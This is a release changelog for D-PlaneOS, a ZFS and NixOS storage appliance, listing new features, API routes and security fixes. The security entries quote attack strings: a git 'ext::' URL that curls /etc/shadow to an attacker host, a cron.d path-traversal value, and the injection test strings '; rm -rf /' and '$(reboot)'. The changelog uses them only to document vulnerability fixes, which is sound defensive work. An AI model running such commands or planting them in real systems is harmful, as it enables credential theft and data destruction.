# D-PlaneOS Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/), and this project adheres to [Semantic Versioning](https://semver.org/).

---

## v3.2.1 (2026-02-21) — **"XSS Sanitisation"**

### 🔒 Security: Frontend XSS sanitisation (T5 closure)
- Added `esc()` / `escapeHtml()` sanitiser to all frontend pages and the alert system
- Server-sourced values (`alert.title`, `alert.message`, `alert.alert_id`, log fields, UPS hardware strings, dataset names, error messages) are now escaped before `innerHTML` insertion
- Affected files: `alert-system.js`, `audit.html`, `docker.html`, `iscsi.html`, `pools.html`, `ups.html`, `reporting.html`, `system-updates.html`
- T5 residual risk downgraded from MEDIUM to LOW in `THREAT-MODEL.md`

### 📄 Documentation
- All version references bumped to v3.2.1 across all docs, scripts, and NixOS modules
- `THREAT-MODEL.md` updated to reflect v3.2.1 security posture (T5 mitigated, Known Gaps updated)

### ✅ Compatibility
- Drop-in replacement for v3.2.0. No schema changes, no daemon flag changes, no config changes.
- Binary rebuilt with `-X main.Version=3.2.1`

---

## v3.2.0 (2026-02-21) — **"networkd Persistence"**

### ⚡ Architecture: systemd-networkd file writer (networkdwriter)
- New package `internal/networkdwriter`: writes `/etc/systemd/network/50-dplane-*.{network,netdev}`
- All network changes now survive reboots AND `nixos-rebuild switch` — no extra steps required
- `networkctl reload` used for zero-downtime live reload (< 1 second)
- Works on every systemd distro: NixOS, Debian, Ubuntu, Arch
- nixwriter scope reduced to NixOS-only settings (firewall ports, Samba globals)
- hostname/timezone/NTP already persistent via OS-level tool calls — no nixwriter needed

### ✅ Completeness
- All 12 nixwriter methods fully wired; all 9 stanzas covered
- New `/api/firewall/sync` endpoint for explicit NixOS firewall port sync
- DNS now has POST handler (`action: set_dns`) + `SetGlobalDNS` via resolved dropin
- `HandleSettings` runtime POST wires hostname + timezone persist calls
- `/etc/systemd/network` added to `ReadWritePaths` in `module.nix`

---

## v3.1.0 (2026-02-21) — **"NixOS Architecture Hardening"**

### ⚡ Architecture: Static musl binary + nixwriter + boot reconciler
- Static musl binary via `pkgsStatic`: glibc-independent, survives NixOS upgrades
- `internal/nixwriter`: writes `dplane-generated.nix` fragments for persistent NixOS config
- Boot reconciler: re-applies VLANs/bonds/static IPs from SQLite DB on non-NixOS systems
- Samba persistence: declarative NixOS ownership + imperative share management via include bridge
- `/etc/systemd/network` naming convention: NixOS owns `10-`/`20-` prefix, D-PlaneOS owns `50-dplane-`

### 🔒 Security & Stability
- SSH hardening: `PasswordAuthentication=false`, `PermitRootLogin=no`; new `sshKeys` NixOS module option
- Support bundle: `POST /api/system/support-bundle` — streams diagnostic `.tar.gz` (ZFS, SMART, journal, audit tail)
- Pre-upgrade ZFS snapshots: automatic `@pre-upgrade-<timestamp>` on all pools before every `nixos-rebuild switch`; `GET /api/nixos/pre-upgrade-snapshots`
- Webhook alerting: generic HTTP webhooks for all system events; `GET/POST/DELETE /api/alerts/webhooks`, test endpoint
- Audit HMAC chain: tamper-evident audit log with HMAC-SHA256; `GET /api/system/audit/verify-chain`; key at `/var/lib/dplaneos/audit.key`

### 📊 Monitoring & Real-Time Alerting
- Background monitor: debounced alerting (5 min cooldown, 30 s hysteresis) for inotify, ZFS health, capacity
- WebSocket hub: real-time events at `WS /api/ws/monitor`
- ZFS pool heartbeat: active I/O test every 30 s; auto-stops Docker on pool failure
- Capacity guardian: configurable thresholds, emergency reserve dataset, auto-release at 95%+
- Deep ZFS health: per-disk risk scoring, SMART JSON integration; `GET /api/zfs/health`
- SMTP alerting: configurable SMTP for system alerts

### 🔁 GitOps
- Declarative `state.yaml`: schema for pools, datasets, shares with stdlib YAML parser
- By-ID enforcement: `/dev/disk/by-id/` required; bare `/dev/sdX` rejected at parse time
- Diff engine: CREATE / MODIFY / DELETE / BLOCKED / NOP classification with risk levels
- Safety contract: pool destroy always BLOCKED; dataset destroy blocked if used > 0 bytes; share remove blocked if active SMB connections
- Transactional apply: halts on unapproved BLOCKED items; idempotent operations
- Drift detection: background worker every 5 min; broadcasts `gitops.drift` WebSocket event
- API: `GET /api/gitops/plan`, `POST /api/gitops/apply`, `POST /api/gitops/approve`, `GET/PUT /api/gitops/state`

### 🏗️ Appliance Hardening (NixOS)
- A/B partition layout (`disko.nix`): EFI + system-a (8 G) + system-b (8 G) + persist (remaining)
- OTA update flow (`ota-update.sh`): Ed25519 signature verification, A/B slot switch, 90 s auto-revert health check
- NixOS OTA module (`ota-module.nix`): systemd health check timer, daemon integration
- Version pinning (`flake.nix`): kernel 6.6 LTS + OpenZFS 2.2, eval-time assertions
- Impermanence layer (`impermanence.nix`): ephemeral root, all state persisted to `/persist`

### New API routes
```
POST   /api/system/support-bundle
GET    /api/nixos/pre-upgrade-snapshots
GET    /api/system/audit/verify-chain
GET    /api/alerts/webhooks
POST   /api/alerts/webhooks
DELETE /api/alerts/webhooks/{id}
POST   /api/alerts/webhooks/{id}/test
GET    /api/gitops/status
GET    /api/gitops/plan
POST   /api/gitops/apply
POST   /api/gitops/approve
POST   /api/gitops/check
GET    /api/gitops/state
PUT    /api/gitops/state
WS     /api/ws/monitor
GET    /api/zfs/health
GET    /api/zfs/iostat
GET    /api/zfs/events
GET    /api/zfs/capacity
POST   /api/zfs/capacity/reserve
POST   /api/zfs/capacity/release
```

---

## v3.0.0 (2026-02-18) — **"Native Docker API"**

### ⚡ Major: Docker exec.Command → stdlib REST client (see previous session)

### ⚡ Major: Linux netlink (`ip link/addr/route`) → stdlib syscall client

New package: `internal/netlinkx` — rtnetlink via raw `syscall.Socket(AF_NETLINK, ...)`, no external dependencies, no CGO.

Replaces ~15 `ip(8)` exec calls across `system.go` and `network_advanced.go`:

| Handler | Replaced |
|---|---|
| `system.go` handleNetworkGet | `ip -j addr show` → `netlinkx.AddrList()` (stdlib `net.Interfaces()`) |
| `system.go` handleNetworkGet | `ip -j route show` → `netlinkx.RouteList()` (reads `/proc/net/route`) |
| `system.go` configure action | `ip addr replace CIDR dev IFACE` → `netlinkx.AddrReplace()` (RTM_NEWADDR) |
| `system.go` configure action | `ip route replace default via GW` → `netlinkx.RouteReplace()` (RTM_NEWROUTE) |
| `network_advanced.go` CreateVLAN | `ip link add ... type vlan` → `netlinkx.LinkAdd(LinkTypeVLAN)` |
| `network_advanced.go` CreateVLAN | `ip link set NAME up` → `netlinkx.LinkSetUp()` |
| `network_advanced.go` CreateVLAN | `ip addr add CIDR dev IFACE` → `netlinkx.AddrAdd()` |
| `network_advanced.go` DeleteVLAN | `ip link delete NAME` → `netlinkx.LinkDel()` |
| `network_advanced.go` ListVLANs | `ip -d link show type vlan` → `netlinkx.LinkList()` filtered |
| `network_advanced.go` CreateBond | `ip link add ... type bond` → `netlinkx.LinkAdd(LinkTypeBond)` |
| `network_advanced.go` CreateBond | `ip link set SLAVE down` → `netlinkx.LinkSetDown()` |
| `network_advanced.go` CreateBond | `ip link set SLAVE master BOND` → `netlinkx.LinkSetMaster()` |

### 🔒 Security fix: Git repository URL RCE via `ext::` transport

**Severity: Critical** (RCE as root daemon user)

git's `ext::` transport protocol executes an arbitrary subprocess:
```
ext::sh -c 'curl http://attacker.com/$(cat /etc/shadow)'
```
A repo URL containing this would have been stored in the DB and executed on the next pull/clone cycle. `file://` similarly allowed reading local files outside the expected path.

**Fix:** `validateRepoURL()` enforces an allowlist of permitted schemes:
- Allowed: `https://`, `http://`, `git://`, `ssh://`, `git@host:path` (SCP)  
- Blocked: everything else (`ext::`, `file://`, `fd::`, custom transports)
- Applied at: `TestConnectivity` (before `git ls-remote`) and `SaveRepo` (before storing to DB)

**Note on go-git:** go-git was evaluated as an alternative. It suffers the same `ext::` vulnerability — the transport is resolved at the git library level, not exec level. URL validation is the correct fix regardless of implementation.

### What ZFS stays exec (and why)

go-libzfs requires CGO + `libzfs-dev` at build time and at runtime. Cross-compilation breaks, deployment packages bloat, and the existing whitelist validation (`security.ValidateCommand`, `security.ValidateDatasetName`, etc.) already prevents injection. The 59 ZFS exec calls are protected by input validation, not by library migration.

### Docker Stats / Compose: exec retained

`docker stats --no-stream` and `docker compose up/down/ps` are exec calls with no user-controlled arguments reaching the command line. No security benefit from replacement.

### 🎨 UI Consolidation
- Shared navigation injected via `nav-shared.js` — eliminates 8KB nav HTML duplicated across 20 pages
- `dplaneos-ui-complete.css` now includes global reset; inline `html{background:#0a0a0a}` resets removed from all pages
- Version badge updated to v3.0.0 across all pages
- NixOS configuration files added (`nixos/flake.nix`, `nixos/module.nix`, `nixos/configuration-standalone.nix`, `nixos/setup-nixos.sh`)

---



All container lifecycle operations now use the Docker Engine REST API directly
over `/var/run/docker.sock` via a thin stdlib `net/http` client — zero new
dependencies, no CGO, no shell involved.

**New package: `internal/dockerclient`** (pure stdlib, no imports outside std library)

| Method | Replaces |
|---|---|
| `ListAll(ctx)` | `docker ps -a --format {{json .}}` |
| `Inspect(ctx, id)` | `docker inspect --format ... NAME` |
| `Start(ctx, id)` | `docker start NAME` |
| `Stop(ctx, id, t)` | `docker stop -t T NAME` |
| `Restart(ctx, id, t)` | `docker restart NAME` |
| `Pause(ctx, id)` | `docker pause NAME` |
| `Unpause(ctx, id)` | `docker unpause NAME` |
| `Remove(ctx, id, force, vol)` | `docker rm [-f] [-v] NAME` |
| `PullImage(ctx, image)` | `docker pull IMAGE` |
| `Logs(ctx, id, opts)` | `docker logs --tail N NAME` |
| `WaitForHealthy(ctx, id, timeout)` | `docker inspect` polling loop |
| `IsAvailable(ctx)` | `docker info` / `which docker` |

Docker API version: v1.41 (Docker Engine 20.10+, shipped since Ubuntu 20.04 LTS).

**Why not the official Docker SDK?**
The `docker/docker` SDK transitively requires `golang.org/x/crypto` and dozens
of other packages. This custom client uses only the Go standard library, giving
the daemon a smaller, fully auditable dependency surface.

**What stays exec (with justification):**

| Call | Why exec stays |
|---|---|
| `docker compose up/down/ps` | Compose v2 is a CLI plugin — it has no stable REST API in Engine v1.41 |
| `docker stats --no-stream` | Stats streaming API requires multiplexed chunked encoding; exec is simpler and no user input is involved |
| `docker volume prune -f` | Maintenance operation, no user-controlled arguments |
| `docker info --format` | System info check, no user input |
| `systemctl stop docker` | Emergency pool-failure stop, not an injection surface |

**Security improvement in `ComposeUp/Down/Status`:**
Replaced the naive `strings.Contains(path, "..")` check with `validateComposeDirPath()`:
- `filepath.Clean()` resolves all `..` components
- Allowlist of permitted base directories: `/opt`, `/srv`, `/home`, `/var/lib/dplaneos`, `/mnt`, `/data`, `/tank`, `/pool`
- Absolute-path enforcement after cleaning

**Breaking changes: none.** All HTTP API paths, request/response shapes, and
frontend behaviour are identical. The migration is purely internal to the daemon.

---

## v2.2.1 (2026-02-18) — **"Security & Reliability Audit Fixes"**

Based on a systematic code audit identifying real implementation gaps (not marketing claims).

### 🔴 Critical: Runtime ZFS Pool Loss → Docker Still Running

**Problem:** The v2.1.1 boot gate prevented the Docker-before-ZFS race at startup.
But if a pool went `SUSPENDED`, `UNAVAIL`, or read-only *during operation* (cable fault,
controller error, drive failure), the heartbeat only logged and alerted — Docker kept
running and containers wrote to the bare mountpoint directory on the root filesystem.

**Fix: `pool_heartbeat.go` — `maybeStopDocker()`**
- New field `StopDockerOnFailure bool`, enabled by default in `main.go`
- On `SUSPENDED/UNAVAIL` or write-probe failure: calls `systemctl stop docker`
- Guard: fires only once per failure window, resets when pool recovers
- Logged at both WARNING and CRITICAL level with restart instructions

### 🔴 Critical: Path Traversal in Git Sync compose_path

**Problem:** `compose_path` from user input was passed directly to `filepath.Join`,
then used in `git add`, `os.WriteFile`, and `docker compose -f`. A value like
`../../etc/cron.d/evil` would escape the repository directory and allow writing
arbitrary files on the system with root privileges.

**Fix: `git_sync_repos.go` — `validateComposePath()`**
- Rejects absolute paths and null bytes
- `filepath.Clean()` resolves `..` components before prefix check
- Prefix check: joined result must stay under `localPath/` with separator
- Applied in **4 places**: `SaveRepo`, `DeployRepo`, `ExportToRepo`, `PushRepo`

### 🟡 Medium: Audit Buffer — Security Events Lost on SIGKILL

**Problem:** All events went through the 100-event buffer flushed every 5 seconds.
A `SIGKILL` (OOM killer, `kill -9`) lost up to 100 events including auth failures,
permission denials, and user management actions.

**Fix: `buffered_logger.go` — `SecurityActions` map + `writeDirect()`**
- 10 security-critical action types bypass the buffer entirely and write directly
  to SQLite in a synchronous transaction: `login`, `login_failed`, `logout`,
  `auth_failed`, `permission_denied`, `user_created/deleted`, `password_changed`,
  `token_created/revoked`
- Non-security events continue to use the buffer (no performance regression)
- `writeDirect()` is a separate code path — cannot deadlock with buffer mutex

### 🟡 Medium: Health Check — 5s Hardcoded, False Positives for Slow Apps

**Problem:** `POST /api/docker/update` waited exactly 5 seconds then declared success.
Databases (PostgreSQL, MariaDB) and Java applications (Nextcloud, Jellyfin AIO) take
10–120 seconds to fully initialize. A container could be "running" but internally
still starting, or pass the running check and then crash 10 seconds later.

**Fix: `docker_enhanced.go` — `waitForHealthy()` + `health_check_seconds`**
- New request field `health_check_seconds` (0 = default 30s)
- `waitForHealthy()` polls every 2 seconds with awareness of Docker's `HEALTHCHECK`:
  - No `HEALTHCHECK` defined: waits for `State.Running == true` (was: identical)
  - `HEALTHCHECK` defined: waits for `Health.Status == "healthy"` (new)
  - `unhealthy`: fails immediately without waiting for timeout
- Default raised from 5s to 30s

### 🟢 Low: ECC Detection Unreliable in Virtual Machines

**Problem:** `dmidecode` in VMs (Proxmox, ESXi, KVM, VirtualBox) returns empty memory
tables or "Unknown" types. The dashboard showed an ECC warning that was technically
meaningless in a virtual environment, causing confusion.

**Fix: `system_status.go` — `ECCStatus` struct + `isVirtualMachine()`**
- VM detection checks `/sys/class/dmi/id/product_name` and `/proc/cpuinfo` hypervisor bit
- Three states instead of binary true/false:
  - Physical + ECC: no warning
  - Physical + no ECC: warning with mitigation link
  - VM / dmidecode unavailable: neutral info message ("check host hardware directly")
- API response adds `ecc_known`, `ecc_virtual`, `ecc_warning_msg` fields
- Dashboard renders correct message per state

### Points Not Fixed (with reasoning)

**Inconsistent SQLite sync (claimed):** Audit found all connections already use
`_synchronous=FULL` after v2.1.1 patches. No further action needed.

**Legacy `exec.Command` vs Go libraries:** Valid architectural concern for future
major versions. Replacing `zfs`/`docker` CLI calls with native APIs is a significant
rewrite scope. Current mitigation is whitelist validation + no shell interpreter
(direct `exec.Command`, not `sh -c`).

---

## v2.2.0 (2026-02-17) — **"Git Sync: Bidirectional Multi-Repo"**

### ✨ New Feature: Bidirectional Git Sync

Full Arcane-style GitHub/Gitea integration for Docker Compose stacks — but built directly
into D-PlaneOS with no external tool required.

**What it does:**

| Direction | Trigger | Effect |
|---|---|---|
| Pull ← Git | Manual / Auto | Clone or pull repo, update local compose file |
| Deploy ← Git | Manual | `docker compose up -d` from repo compose file |
| Export → Git | Manual | Snapshot running containers as `docker-compose.yml` |
| Push → Git | Manual | `git commit + push` compose file to remote |

**Architecture: Multi-Repo Syncs**

Replaces the old single-global-config model with named syncs — each with its own:
- Repository URL + branch
- Compose file path (relative to repo root, e.g. `stacks/nextcloud/compose.yml`)
- Credential reference
- Optional auto-sync interval (1–1440 min)
- Commit author identity

**Credential Store (`git_credentials` table)**

A new credential store decouples auth from individual syncs:
- Name each credential for reuse across multiple repos
- PAT (Personal Access Token): stored server-side via `GIT_ASKPASS` script — never appears in URLs or logs
- SSH Key: written to `/var/lib/dplaneos/ssh-keys/`, referenced by path in `GIT_SSH_COMMAND`
- Test button: runs `git ls-remote` against a target repo to verify connectivity before saving

**PAT Setup Wizard in UI**

The "Add Credential" modal includes a step-by-step GitHub PAT guide:
1. Link to `github.com/settings/tokens` (fine-grained and classic)
2. Required scopes shown as badges: `repo` (classic) or `Contents: R/W` + `Metadata: R` (fine-grained)
3. Explanation that tokens are stored server-side and masked in the UI after first save

**New Backend: `git_sync_repos.go`**
- `GET/POST /api/git-sync/credentials` — list and save credentials
- `POST /api/git-sync/credentials/test` — test connectivity via `git ls-remote`
- `POST /api/git-sync/credentials/delete`
- `GET/POST /api/git-sync/repos` — list and save syncs
- `POST /api/git-sync/repos/delete`
- `POST /api/git-sync/repos/pull` — clone or `git pull --rebase`
- `POST /api/git-sync/repos/push` — `git add compose_path && git commit && git push`
- `POST /api/git-sync/repos/deploy` — `docker compose up -d --remove-orphans`
- `POST /api/git-sync/repos/export` — `docker inspect` → compose YAML → write to repo

**New DB Tables (non-breaking, `IF NOT EXISTS`)**
- `git_sync_repos` — per-sync configuration
- `git_credentials` — named credential store
- Index: `idx_git_repos_name`

**New Frontend: `git-sync.html` (956 lines)**
- Three-tab layout: Syncs · Credentials · Legacy Config
- Per-sync cards with: status dot, last commit hash, relative time, error display
- Action buttons: Pull / Deploy / Export Stack / Push to Git
- Add/Edit sync modal with credential picker + auto-sync toggle
- Add/Edit credential modal with PAT wizard, SSH paste, connection test
- JetBrains Mono monospace aesthetic consistent with terminal/ops theme
- All onclick string args use `JSON.stringify()` — XSS-safe

**Legacy Compatibility**
The old single-repo config (`/api/git-sync/config`, `pull`, `push`, `stacks`, `deploy`,
`export`) is fully preserved on a "Legacy Config" tab. Existing setups are not broken.

### 🔧 Other Fixes (carried from prior session)
- `docker_enhanced.go`: missing `regexp` import added
- `go vet ./...`: clean

---

## v2.1.1 (2026-02-17) — **"Security, Stability & Architecture"**

### 🔴 Showstopper Fix: ZFS-Docker Boot Race (Critical)
The most dangerous bug in any ZFS NAS: Docker starting before ZFS pools are mounted,
causing containers to write to the bare mountpoint directory on the root filesystem.
When ZFS mounts seconds later, those writes are lost or inaccessible — **silent data loss**.

**Fix: Hard systemd gate** (`dplaneos-zfs-mount-wait.service`)
- Polls until every configured pool is `ONLINE`, mounted, **and writable** (write-probe test)
- `dplaned.service` and `docker.service` both `Require=` this gate — they **cannot start** without it
- 5-minute timeout with 30-second progress logging; failure message includes manual override instructions
- `install.sh` writes `/etc/dplaneos/expected-pools.conf` with currently imported pools
- Dashboard reports gate status via `/api/system/zfs-gate-status`
- New file: `systemd/dplaneos-zfs-mount-wait.service`
- New file: `scripts/zfs-mount-wait.sh`
- New file: `systemd/docker.service.d/zfs-dependency.conf`

### 🟡 ECC RAM: Advisory, Not Blocker
- Dashboard (`/api/status`) detects non-ECC RAM via `dmidecode` and shows a persistent
  **informational** notice (blue, not red). Never blocks operation.
- `INSTALLATION-GUIDE.md`: new ECC recommendation section with clear home-vs-business guidance
- `NON-ECC-WARNING.md`: updated mitigations to reflect v2.1.1 actual implementations
  (ARC limiting, weekly scrub scheduling, WAL FULL sync, dashboard advisory)
- Version references corrected throughout all documentation files

### 🟡 Notification Debouncing (Flooding Fix)
- `monitoring/background.go` completely rewritten with proper debounce/hysteresis:
  - **Hysteresis window** (30s): condition must persist before first alert fires
  - **Cooldown** (5 min): same event+level won't repeat within cooldown period
  - **Clear event**: fires once when condition resolves, then enters clearance cooldown (2 min)
  - **Info level** (UI dashboard refresh): always passes through, no debounce
- Prevents fan-flapping from sending thousands of alerts per second

### 🟡 SQLite Durability (Power-Loss Safety)
- `alerting_smtp.go`: all 5 DB connections upgraded to `_synchronous=FULL` (was missing)
- `enterprise_hardening.go`: rotDB connection upgraded to `_synchronous=FULL`
- Main DB and session DB already had `_synchronous=FULL` — now consistent across all connections
- Combined with existing WAL mode + checkpoint-on-startup, audit log survives hard power loss

### 🔒 Security Fixes (XSS)
- All `onclick="func('${serverData}')"` patterns replaced with `JSON.stringify()` across 9 pages:
  cloud-sync, docker, files, network, pools, removable-media, replication, shares, snapshot-scheduler, users
- `audit.html`, `ups.html`: truncated `handleLogout()` completed
- `settings.html`: NixOS version display switched from `innerHTML` to `textContent`
- Dashboard alert rendering rewritten with DOM API (no innerHTML with alert messages)

### 🐛 Bug Fixes
- URL fixes (`&param=` → `?param=`): 5 locations across ZFS, RBAC, network endpoints
- `docker-containers-ui.html`: log URL fixed to `/api/docker/logs?container=`
- `modules.html`: data normalization, Names array handling, action endpoints corrected
- `pools.html`: stray Network header removed; DOM-rewritten card rendering; `handleLogout` fixed
- `users.html`: `handleLogout` and `editGroup` URL fixed
- `network.html`: `window.ui` double-init guard; DOM-rewritten interface cards

### 🔧 Backend Fixes
- `disk_discovery.go`: recursive `hasMountPoint()`, regex `diskNameInZpoolStatus()` (no false positives)
- `docker.go`: `groupContainersByStack()` — response normalized with stacks/totals
- `enterprise_hardening.go`: watchdog status safe zero values when inactive
- `system.go`: `handleNetworkPost` with IP/CIDR validation, atomic `ip addr replace`
- `system_extended.go`: `ConfigDir` fix for cron directory creation
- `users_groups.go`: `respondError` argument order corrected
- `zfs_encryption.go`: `change-key -l` flag; key validation

### 🧪 Tests
- New: `daemon/internal/handlers/disk_discovery_test.go`

---

## v2.1.0 (2026-02-15) — **"ZFS-Docker Integration"**

### ⚡ Safe Container Updates (Killer Feature)

New endpoint `POST /api/docker/update` performs atomic container updates with ZFS data protection:

1. Creates ZFS snapshot of container volume
2. Pulls new image
3. Stops and restarts container
4. Runs health check (5s)
5. On failure: returns snapshot name for instant rollback

No other NAS OS offers this level of container update safety.

### Added

- **Safe Docker Updates** — `POST /api/docker/update` (ZFS snapshot + pull + restart + health check + auto-rollback)
- **ZFS Snapshot CRUD** — `GET/POST/DELETE /api/zfs/snapshots`, `POST /api/zfs/snapshots/rollback`
- **ZFS Time Machine** — `GET /api/timemachine/versions`, `GET /api/timemachine/browse`, `POST /api/timemachine/restore` (browse snapshots as folders, restore single files)
- **ZFS Sandbox** — `POST /api/sandbox/create`, `GET /api/sandbox/list`, `DELETE /api/sandbox/destroy` (ephemeral Docker environments via ZFS clone, zero disk cost)
- **ZFS Remote Replication** — `POST /api/replication/remote`, `POST /api/replication/test` (native `zfs send | ssh zfs recv`, block-level, preserves snapshots)
- **ZFS Health Predictor** — `GET /api/zfs/health`, `GET /api/zfs/iostat`, `GET /api/zfs/events`, `GET /api/zfs/smart` (per-disk error tracking, risk levels, checksum monitoring, S.M.A.R.T. integration)
- **NixOS Config Guard** — `GET /api/nixos/detect`, `POST /api/nixos/validate`, `GET /api/nixos/generations`, `POST /api/nixos/rollback` (dry-activate validation, generation management — NixOS only)
- **Docker Compose** — `POST /api/docker/compose/up`, `POST /api/docker/compose/down`, `GET /api/docker/compose/status`
- **Container Stats** — `GET /api/docker/stats` (CPU, memory, network I/O per container)
- **Docker Pull/Remove** — `POST /api/docker/pull`, `POST /api/docker/remove`
- **Container pause/unpause** — Added to existing `POST /api/docker/action`
- **Pool Capacity Guardian** — `GET /api/zfs/capacity`, `POST /api/zfs/capacity/reserve`, `POST /api/zfs/capacity/release` (2% emergency reserve, auto-release at 95%, background monitoring every 5 min)
- **Resumable Replication** — `zfs send -s` / `zfs recv -s` resume token support for interrupted multi-TB transfers
- **Command Timeouts** — All system commands wrapped with deadlines (5s/30s/120s), prevents API hang on zombie disks
- **ionice Background Tasks** — `executeBackgroundCommand()` runs indexing/thumbnailing at idle I/O priority (class 3)
- **SSH Keepalive** — Replication SSH connections use `ServerAliveInterval=30` to detect dead connections
- **NixOS support** — Complete Flake + standalone `configuration.nix` in `nixos/` directory
- **Configurable daemon paths** — `--config-dir` and `--smb-conf` flags for NixOS compatibility

### Changed

- Routes: 105 → 171 (+66 new endpoints)
- Handler files: 24 → 37 (+13 new files)
- Daemon memory limit: 512 MB → 1 GB (configurable per system)
- ZFS ARC default: 8 GB → 16 GB (configurable per system)
- SQLite backups now use `.backup` command (WAL-safe, no corruption risk)
- Daemon waits for `zfs-mount.service` before starting (prevents race condition)

### Security

- Strict regex validation on all ZFS dataset names, snapshot names, container names
- Path traversal protection on Time Machine browse, snapshot restore, Docker Compose
- SSH command injection prevention on remote replication (strict character whitelist)
- NixOS endpoints gracefully disabled on non-NixOS systems
- `sudo` requires password in NixOS config (`wheelNeedsPassword = true`)

### No Breaking Changes

Drop-in replacement for v2.0.0. Same database schema, same daemon flags, same frontend.

---

## v2.0.0 (2026-02-12) — **"Ground-Up Rewrite"**

### ⚡ The Complete Platform Rewrite

D-PlaneOS v2.0.0 is a full architectural rewrite. The PHP/Apache stack that powered v1.x has been replaced by a single Go binary (`dplaned`) serving both the API and the frontend. No PHP, no Apache, no Node — one 8 MB binary does everything.

This is not an upgrade from v1.14.0-OMEGA. It is a clean-room reimplementation retaining full feature parity and adding 20+ new capabilities.

### Architecture Change

| Component | v1.x (PHP) | v2.0.0 (Go) |
|-----------|-----------|-------------|
| Backend | PHP-FPM + Apache | Single Go binary (`dplaned`, 8 MB) |
| Database | SQLite via PHP PDO | SQLite via `go-sqlite3` with WAL, 64 MB cache, FULL sync |
| Auth | PHP sessions + cookies | Session tokens + RBAC middleware |
| Frontend | PHP-rendered SPA | Static HTML + vanilla JS, hybrid SPA router |
| Config | `/etc/dplaneos/*.conf` | SQLite + CLI flags |
| Install | `install.sh` (50+ steps) | `make install` (one command) |
| Process model | Apache workers + FPM pool | Single binary, goroutines |
| Memory limit | 512 MB (FPM pool) | 512 MB (systemd MemoryMax) |

### Added — Backend

- **Go daemon** (`dplaned`) — 38 Go source files, 85 API routes, single binary
- **Schema auto-initialization** — 11 SQLite tables + 7 indexes created on first start
- **Default data seeding** — 4 RBAC roles (admin/operator/user/viewer), 27 permissions, admin user, LDAP config, Telegram config — all bootstrapped automatically
- **LDAP/Active Directory integration** — full LDAP handler with bind, search, sync, group mapping, JIT provisioning, test connection, sync history
- **RBAC engine** — roles, permissions, role-permission mapping, user-role assignment with expiry, permission cache with TTL
- **Buffered audit logging** — batched inserts (100-event buffer, 5-second flush) to prevent I/O stalls on large pools
- **Background system monitoring** — goroutine-based metrics collection (CPU, memory, disk I/O, network, ZFS pool health)
- **WebSocket live updates** — `/ws/monitor` endpoint for real-time system metrics
- **ZFS encryption management** — create encrypted datasets, lock/unlock, change keys, list encryption status
- **Removable media handler** — detect, mount, unmount, eject USB/removable devices with full input validation
- **Replication** — ZFS send/receive, incremental send, remote replication
- **Snapshot scheduler** — create/list/delete schedules, run-now capability
- **Firewall management** — UFW status, add/remove rules
- **SSL/TLS certificate management** — list, generate self-signed, activate
- **Trash/Recycle bin** — move to trash, restore, empty, list
- **Power management** — disk spindown configuration, immediate spindown, disk power status
- **Cloud sync** — rclone-based cloud backup and sync (UI + backend)
- **IPMI hardware monitoring** — real-time sensor data via `ipmitool`
- **Telegram notifications** — configure bot token/chat ID, test delivery, toggle on/off
- **Docker management** — list containers, start/stop/restart/remove, image pull
- **File management** — list, upload, delete, rename, copy, mkdir, chmod, chown, properties
- **ACL management** — get/set POSIX ACLs on files and directories
- **Quota management** — ZFS user/group quotas
- **NFS export management** — list exports, reload (graceful degradation if NFS not installed)
- **SMB management** — reload config, test config
- **Backup** — rsync-based backup
- **System logs** — journalctl integration with filtering
- **UPS monitoring** — NUT integration for UPS status
- **Reporting/Metrics** — current metrics + historical data
- **Network management** — interface listing and configuration
- **Graceful shutdown** — SIGTERM/SIGINT handler with connection draining
- **OOM protection** — systemd `MemoryMax=512M` enforced
- **Off-pool backup** — `-backup-path` flag for daily VACUUM INTO to separate disk

### Added — Security

- **Input validation on all `exec.Command` calls** — `ValidatePoolName`, `ValidateDatasetName`, `ValidateDevicePath`, `ValidateMountPoint`, `ValidateIP` — all shell metacharacters blocked
- **Command whitelist** — only explicitly allowed binaries can be executed
- **Session middleware** — every API request validated (format check + DB lookup + user match)
- **Rate limiting middleware** — request throttling on all endpoints
- **Injection protection** — tested with `; rm -rf /`, `$(reboot)`, path traversal, all return HTTP 400
- **Fail-closed session validation** — any DB error rejects the request (no fallback to permissive mode)
- **ZED hook integration** — ZFS Event Daemon triggers alerts on pool errors
- **Audit logging** — all state-changing operations logged with user, action, resource, IP, timestamp

### Added — Frontend

- **41 HTML pages** — 36 with full navigation, 5 standalone (setup-wizard, reset-wizard, dashboard-redirect, docker sub-UIs)
- **Hierarchical navigation** — 6 top-level sections (Storage, Compute, Network, Identity, Security, System) with 35 sub-navigation links
- **Hover-intent flyout** — desktop sub-nav opens on hover with 120 ms intent delay + 280 ms grace period, touch/mobile unaffected
- **Hybrid SPA router** — sub-nav clicks swap content via fetch + fade (200 ms) without full page reload; cross-section clicks do full navigation
- **Material Symbols** — locally hosted icon font, no external CDN dependency
- **Design system** — CSS custom properties for colors, spacing, typography; Material Design 3 components
- **UI polish layer** — harmonized timing (140/260/200 ms tiers), unified easing (`cubic-bezier(0.4, 0, 0.2, 1)`), 8 px spacing grid, state clarity (active/hover/focus differentiation), `prefers-reduced-motion` support
- **Anti-flash** — `html{background:#0a0a0a}` inline style prevents white flash on load
- **Keyboard shortcuts** — `g+d` Dashboard, `g+s` Storage, `g+c` Compute, etc.; `?` shows help
- **Connection monitor** — detects backend connectivity loss, shows reconnection status
- **Form validation** — client-side validation library
- **Toast notifications** — non-blocking success/error/info/warning messages

### Added — DevOps

- **Makefile** — `make build`, `make install`, `make clean`, `make help`
- **systemd service** — `dplaned.service` with auto-restart, watchdog, resource limits
- **CI/CD script** — `scripts/build-release.sh` with smoke tests
- **Upgrade script** — `scripts/upgrade-with-rollback.sh` with ZFS snapshot rollback
- **Error reference** — `ERROR-REFERENCE.md` documenting all HTTP codes, validation errors, diagnostics

### Changed (from v1.14.0-OMEGA)

- Backend language: **PHP → Go**
- Process model: **Apache + FPM pool → single binary**
- Auth system: **PHP sessions → token-based sessions with RBAC middleware**
- Database access: **PHP PDO → Go `database/sql` with connection pooling**
- Command execution: **PHP `exec()` with string validation → Go `exec.Command` with argument-level validation**
- Frontend rendering: **PHP-rendered HTML → static HTML with JS fetch**
- Navigation: **sidebar SPA → top-nav with section flyouts and hybrid router**
- Color scheme: **`#667eea` → `#8a9cff`** (lighter, higher contrast)
- Nav style: **pill sub-nav → underline top-nav with pill sub-nav**

### Removed

- PHP backend (all `.php` files)
- Apache configuration
- PHP-FPM configuration
- Node.js dependencies
- `install.sh` multi-step installer (replaced by `make install`)
